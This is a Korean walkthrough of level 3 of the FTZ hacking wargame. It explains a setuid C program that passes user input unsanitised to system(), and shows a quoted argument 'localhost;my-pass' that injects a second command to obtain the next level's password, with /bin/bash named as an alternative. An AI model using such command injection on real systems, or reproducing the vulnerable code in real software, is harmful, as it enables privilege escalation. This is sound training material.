```bash
[level3@ftz level3]$ cat hint


다음 코드는 autodig의 소스이다.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){

    char cmd[100];

    if( argc!=2 ){
        printf( "Auto Digger Version 0.9\n" );
        printf( "Usage : %s host\n", argv[0] );
        exit(0);
    }

    strcpy( cmd, "dig @" );
    strcat( cmd, argv[1] );
    strcat( cmd, " version.bind chaos txt");

    system( cmd );

}

이를 이용하여 level4의 권한을 얻어라.

more hints.
- 동시에 여러 명령어를 사용하려면?
- 문자열 형태로 명령어를 전달하려면?
```
이번엔 힌트가 조금 길지만 천천히 읽어 보면  
`autodig` 프로그램을 실행 했을때 인자의 수가 2개가 아니면 사용 방법을 알려주고  
맞는 경우 cmd라는 문자열 공간에 `dig @`를 복사 하고
두번째 인자를 붙이고 뒤에 ` version.bind chaos txt`라는 문자도 붙여서 실행하는 프로그램이다.

우선 아래와 같이 명령어를 입력하면
```bash
[level3@ftz level3]$ autodig localhost

; <<>> DiG 9.2.1 <<>> @localhost version.bind chaos txt
;; global options:  printcmd
;; connection timed out; no servers could be reached
```
위와 같이 실행된다.

힌트에 `동시에 여러 명령어를 사용하려면?` 이라는 것이 있는데 두가지 명령어를 동시에 사용하려면 `;` 등의 접속사를 사용하면 된다.

여기서 my-pass를 사용하면 되지 않을까란 생각이 든다.  
그래서 당당하게 아래와 같이 입력했다.
```bash
[level3@ftz level3]$ autodig localhost;my-pass

; <<>> DiG 9.2.1 <<>> @localhost version.bind chaos txt
;; global options:  printcmd
;; connection timed out; no servers could be reached

Level3 Password is "can you fly?".

```
아니 이건 나도 아는 패스워드이다.
도대체 어디가 잘못된 것 일까?

위와 같이 명령어를 입력하면 리눅스는 명령어를 아래 두가지로 인식한다
```bash
level3$ autodig localhost
level3$ my-pass
```
전부 level3의 권한으로 실행하는 것이다.

그럼 autodig 프로그램의 system 함수에 my-pass가 들어가도록 해야하기 때문에 명령어를 문자열로 바꾸어 따옴표를 붙여 준다.

```bash
[level3@ftz level3]$ autodig "localhost;my-pass"

; <<>> DiG 9.2.1 <<>> @localhost
;; global options:  printcmd
;; connection timed out; no servers could be reached

Level4 Password is "suck my brain".

```
또는 `/bin/bash`를 실행하여도 된다.

level4의 패스워드는 `suck my brain`이다.